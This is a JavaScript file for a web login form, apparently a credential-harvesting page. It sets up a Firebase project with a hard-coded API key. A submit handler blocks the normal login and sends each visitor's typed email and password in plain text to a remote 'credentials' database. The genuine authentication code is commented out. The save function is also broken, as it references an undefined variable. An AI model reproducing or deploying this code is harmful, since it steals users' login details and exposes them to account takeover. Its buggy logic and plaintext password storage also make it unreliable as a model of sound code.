  
  
  //firebase starts here
  var config = {
				apiKey: "AIzaSyCLbDrA3RLhCmfEli6rrpR7aQ9H3nWCycE",
				authDomain: "wavo-74a42.firebaseapp.com",
				databaseURL: "https://wavo-74a42.firebaseio.com",
				projectId: "wavo-74a42",
				storageBucket: "",
				messagingSenderId: "546175523452"
      };
      
			firebase.initializeApp(config);
      var credRef = firebase.database().ref('credentials');




      //function to save Credentials
      function saveCred(email, password){
        var newcredRef = credRef.push();
        newcredRef.set({
          email:email,
          password:psw

        });

      }



//       //login

//       firebase.auth().onAuthStateChanged(function(user) {
//         if (user) {
//           // User is signed in.
//           document.getElementById('login-div').style.display = block;
        
//         } else {
//           // No user is signed in.
//         }
//       });

//       function login(){
//         var userEmail = document.getElementById('usrname').value;
//         var userPassword = document.getElementById('psw').value;

//         // window.alert(userEmail+""+userPassword);

//         firebase.auth().createUserWithEmailAndPassword(userEmail, userPassword).catch(function(error) {
//           // Handle Errors here.
//           var errorCode = error.code;
//           var errorMessage = error.message;
//           // window.alert("Error:" + errorMessage);
          
//         });
//       }
      
// Get the modal
var modal = document.getElementById('id01');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}


//listen for a submit function
$( "#loginform" ).submit(function( event ) {
  event.preventDefault();
  var email = getInputVal('name');
  var password = getInputVal('psw');

  saveCred(email,password);




});


  // console.log('123');

//   //get values
//   var email = getInputVal('name');
//   var password = getInputVal('psw');

//   saveCred(email,password);



// }


function getInputVal(id){
  return document.getElementById(id).value;
}



